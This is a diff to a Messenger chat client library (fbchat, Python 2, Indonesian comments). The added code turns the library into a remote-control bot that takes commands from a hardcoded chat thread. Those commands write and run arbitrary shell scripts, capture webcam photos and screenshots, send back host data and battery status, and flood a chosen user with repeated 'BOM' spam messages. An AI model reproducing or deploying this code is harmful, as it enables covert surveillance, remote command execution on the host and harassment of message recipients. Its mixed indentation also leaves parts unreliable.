@@ -12,8 +12,11 @@ from models import *
 from graphql import *
 from index import *
 import os
-
+import sys
+import cv2
+import datetime
 import time
+import thread
 try:
     from urllib.parse import urlparse, parse_qs
 except ImportError:
@@ -49,6 +52,12 @@ class Client(object):
         self.req_url = ReqUrl()
         self.isi = None
         self.jum = 0
+        self.foto = False
+        self.pesan = False
+        self.pesan_isi = "oke"
+        self.bat_status = True
+	self.ping_control = True
+	self.jail = False
         if not user_agent:
             user_agent = choice(USER_AGENTS)
 
@@ -59,9 +68,8 @@ class Client(object):
             'User-Agent' : user_agent,
             'Connection' : 'keep-alive',
         }
-
+        
         handler.setLevel(logging_level)
-
         # If session cookies aren't set, not properly loaded or gives us an invalid session, then do the login
         if not session_cookies or not self.setSession(session_cookies) or not self.isLoggedIn():
             self.login(email, password, max_tries)
@@ -83,59 +91,105 @@ class Client(object):
         return payload
 
     def _fix_fb_errors(self, error_code):
-        if error_code == '1357004':
-            log.warning('Got error #1357004. Doing a _postLogin, and resending request')
-            self._postLogin()
-            return True
-        return False
+	if error_code == '1357004':
+		log.warning('Got error #1357004. Doing a _postLogin, and resending request')
+		self._postLogin()
+		return True
+	return False
 
     def _get(self, url, query=None, timeout=30, fix_request=False, as_json=False, error_retries=3, free=False):
         payload = self._generatePayload(query)
-
+	jcontrol = True
         if free:
-			r = self._session.get(url, headers=self._header, params=payload, timeout=timeout, verify=self.ssl_verify)
-			out = check_listen(r)
-			index = Starting(out)
-			index.getOut(self.jum)
-			self.jum += 1
-			if self.jum == 30000:
-				self.jum = 0
-			if out == "u'kamera'":
-				self.send(Message(text = 'Upload foto ...'), thread_id=100022394016980, thread_type=ThreadType.USER)
-				index.getFoto()
-				sukses = self.sendLocalImage("/root/al.jpg", thread_id=100022394016980, thread_type=ThreadType.USER) # ke shun
-				if sukses:
-					os.system("rm /root/al.jpg")
-			elif out == "u'pesan'":
-				os.system("xterm -title 'Pesan' -e python /root/AL/ssh/pesan.py &")
-				self.send(Message(text = 'Pesan berhasil dibuat'), thread_id=100022394016980, thread_type=ThreadType.USER)
-			elif out == "u'help'":
-				self.send(Message(text = 'kamera,pesan,help,opencv,database,shell,baterai'), thread_id=100022394016980, thread_type=ThreadType.USER)
-			elif out == "u'opencv'":
-				buka = os.system("xterm -title 'Mata' -e python /root/AL/ssh/mata.py &")
-				self.send(Message(text = 'opencv sukses dibuka'), thread_id=100022394016980, thread_type=ThreadType.USER)
-			elif out == "u'database'":
-				self.send(Message(text = index.setDatabase("lihat")), thread_id=100022394016980, thread_type=ThreadType.USER)
-			elif out == "u'shell'":
-				self.send(Message(text = 'Shell --> pastikan code tetap -_-ls#'), thread_id=100022394016980, thread_type=ThreadType.USER)
-				os.system("python /root/AL/ssh/shell.py")
-			elif out == "u'baterai'":
-				os.system("echo `cat /sys/class/power_supply/BAT1/uevent` > /root/AL/baterai.txt")
-				bat = open("/root/AL/baterai.txt",'r')
-				self.send(Message(text = bat.read()), thread_id=100022394016980, thread_type=ThreadType.USER)
-				bat.close()
-        else:
-			print "----- Tunggu ------"
-			r = self._session.get(url, headers=self._header, params=payload, timeout=timeout, verify=self.ssl_verify)
-			if not fix_request:
-				return r
+		r = self._session.get(url, headers=self._header, params=payload, timeout=timeout, verify=self.ssl_verify)
+		out = check_listen(r)
+		index = Starting(out)
+		index.getOut(self.jum)
+		try:
+			if os.popen("cat /sys/class/power_supply/BAT1/capacity").read() == "3":
+				self.send(Message(text = 'baterai lemah : 3%'), thread_id=100022394016980, thread_type=ThreadType.USER)
+			elif os.popen("cat /sys/class/power_supply/BAT1/status").read() == "Discharging"  &  self.bat_status:
+				self.bat_status = False
+				self.send(Message(text = 'Discharging atau mati lampu'), thread_id=100022394016980, thread_type=ThreadType.USER)
+			elif os.popen("cat /sys/class/power_supply/BAT1/status").read() == "Unknown":
+				self.bat_status = True
+		except Exception:
+			o=0
+		try:
+			sh = out.split("(")
+			if sh[0] == "u'shell":
+				print sh[1]
+				self.send(Message(text = 'shell disimpan >> exe untuk exekusi'), thread_id=100022394016980, thread_type=ThreadType.USER)
+				self.shell(sh[1])
+			elif sh[0] == "u'jail":
+				jail_id = sh[1].split("'")
+				self.jail = False
+				try:
+					self.send(Message(text = 'Jail mengirim...'), thread_id=100022394016980, thread_type=ThreadType.USER)
+					while jcontrol:
+						if self.send(Message(text = jail_id[0]+' BOM %*(%^&$%& BOM *^&&$%$#&^^ BOM'), thread_id=jail_id[0], thread_type=ThreadType.USER):
+							self.ping_control = False
+							self._ping(self.sticky, self.pool)
+							if self.jail:
+								self.ping_control = True
+								self.ping()
+								self.jail = False
+								break
+
+
+				except Exception, e:
+					self.send(Message(text = 'jail gagal !!!'), thread_id=100022394016980, thread_type=ThreadType.USER)
+
+		except Exception, e:
+			print e
+		self.jum += 1
+		if self.jum == 30000:
+			self.jum = 0
+
+		if out == "u'jstop'":
+			self.jail = True
+			self.send(Message(text = 'jail stop -->'), thread_id=100022394016980, thread_type=ThreadType.USER)
+		elif out == "u'help'":
+			self.send(Message(text = 'exe, shell(bash, jail(id=15, jstop, layar,help, kamera, database, baterai'), thread_id=100022394016980, thread_type=ThreadType.USER)
+		elif out == "u'kamera'":
+			self.send(Message(text = 'Mengirim foto...'), thread_id=100022394016980, thread_type=ThreadType.USER)
+                	index.setLocal('kamera')
+                	time.sleep(2)
 			try:
-				return check_request(r, as_json=as_json)
-			except FBchatFacebookError as e:
-				if error_retries > 0 and self._fix_fb_errors(e.fb_error_code):
-					return self._get(url, query=query, timeout=timeout, fix_request=fix_request, as_json=as_json, error_retries=error_retries-1)
-				raise e
-	
+                		self.sendLocalImage("/root/AL/kamera.jpg", thread_id=100022394016980, thread_type=ThreadType.USER)
+			except Exception, e:
+				print e
+		elif out == "u'database'":
+			self.send(Message(text = index.setDatabase("lihat")), thread_id=100022394016980, thread_type=ThreadType.USER)
+		elif out == "u'layar'":
+			self.send(Message(text = 'kirim screenshoot...'), thread_id=100022394016980, thread_type=ThreadType.USER)
+			os.system("import -window root /root/AL/layar.png")
+			self.sendLocalImage("/root/AL/layar.png", thread_id=100022394016980, thread_type=ThreadType.USER)
+
+		elif out == "u'exe'":
+			self.send(Message(text = 'shell diexekusi'), thread_id=100022394016980, thread_type=ThreadType.USER)
+			exe = os.popen("xterm -e sh /root/AL/shell.sh").read()
+			try:
+				self.send(Message(text = "%s"% exe), thread_id=100022394016980, thread_type=ThreadType.USER)
+			except Exception:
+				self.send(Message(text = 'Hasil: exe tidak bisa ditampilkan'), thread_id=100022394016980, thread_type=ThreadType.USER)
+
+		elif out == "u'baterai'":
+			os.system("echo `cat /sys/class/power_supply/BAT1/uevent` > /root/AL/baterai.txt")
+			bat = open("/root/AL/baterai.txt",'r')
+			self.send(Message(text = bat.read()), thread_id=100022394016980, thread_type=ThreadType.USER)
+			bat.close()
+        else:
+		print "----- Tunggu ------"
+		r = self._session.get(url, headers=self._header, params=payload, timeout=timeout, verify=self.ssl_verify)
+		if not fix_request:
+			return r
+		try:
+			return check_request(r, as_json=as_json)
+		except FBchatFacebookError as e:
+			if error_retries > 0 and self._fix_fb_errors(e.fb_error_code):
+				return self._get(url, query=query, timeout=timeout, fix_request=fix_request, as_json=as_json, error_retries=error_retries-1)
+			raise e
 
     def _post(self, url, query=None, timeout=30, fix_request=False, as_json=False, error_retries=3):
         payload = self._generatePayload(query)
@@ -274,10 +328,7 @@ class Client(object):
                     or 'enter login code to continue' in r.text.lower())):
             r = self._2FA(r)
 
-        # Sometimes Facebook tries to show the user a "Save Device" dialog
-        if 'save-device' in r.url:
-            r = self._cleanGet(self.req_url.SAVE_DEVICE)
-
+        
         if 'home' in r.url:
             self._postLogin()
             return True, r.url
@@ -360,8 +411,8 @@ class Client(object):
         return True
 
     def login(self, email, password, max_tries=5):
-        self.onLoggingIn(email=email)
-
+        log.info("Loggin ke ({})...".format(email))
+        
         if max_tries < 1:
             raise FBchatUserError('Cannot login: max_tries should be at least one')
 
@@ -378,7 +429,8 @@ class Client(object):
                 time.sleep(1)
                 continue
             else:
-                self.onLoggedIn(email=email)
+                log.info("Login akun {} sukses.".format(email))
+                self.ping()
                 break
         else:
             raise FBchatUserError('Login failed. Check email/password. (Failed on url: {})'.format(login_url))
@@ -439,7 +491,7 @@ class Client(object):
     """
 
     def fetchAllUsers(self):
-		
+
 		# penggunaa : print client.fetchAllUsers()"
         """
         Gets all users the client is currently chatting with
@@ -902,17 +954,6 @@ class Client(object):
         return message_id
 
     def send(self, message, thread_id=None, thread_type=ThreadType.USER):
-        """
-        Sends a message to a thread
-
-        :param message: Message to send
-        :param thread_id: User/Group ID to send to. See :ref:`intro_threads`
-        :param thread_type: See :ref:`intro_threads`
-        :type message: models.Message
-        :type thread_type: models.ThreadType
-        :return: :ref:`Message ID <intro_message_ids>` of the sent message
-        :raises: FBchatException if request failed
-        """
         thread_id, thread_type = self._getThread(thread_id, thread_type)
         data = self._getSendData(message=message, thread_id=thread_id, thread_type=thread_type)
 
@@ -1305,10 +1346,18 @@ class Client(object):
     """
     LISTEN METHODS
     """
-    def listen(self, markAlive=True):
-		while True:
-			self._ping(self.sticky, self.pool)
-		
+    
+    def shell(self, data):
+		a = data.split("'")
+		exe = open("/root/AL/shell.sh",'w')
+		exe.write("#!/bin/bash\n\n"+a[0])
+		exe.close()
+    def ping(self, markAlive=True):
+    	s = Starting()
+    	s.setDatabase(control='setKonstanta', isi='ping_run')
+        while self.ping_control:
+            self._ping(self.sticky, self.pool)
+
     def _ping(self, sticky, pool):
         data = {
             'channel': self.user_channel,
@@ -1575,18 +1624,10 @@ class Client(object):
     """
     EVENTS
     """
-
-    def onLoggingIn(self, email=None):
-        if format(email) == "081229059446":
-			log.info("Loggin ke AL({})...".format(email))
-		
 		
     def on2FACode(self):
         """Called when a 2FA code is needed to progress"""
         return input('Please enter your 2FA code --> ')
-
-    def onLoggedIn(self, email=None):
-		log.info("Login akun {} sukses.".format(email))
 
     def onListening(self):
         """Called when the client is listening"""
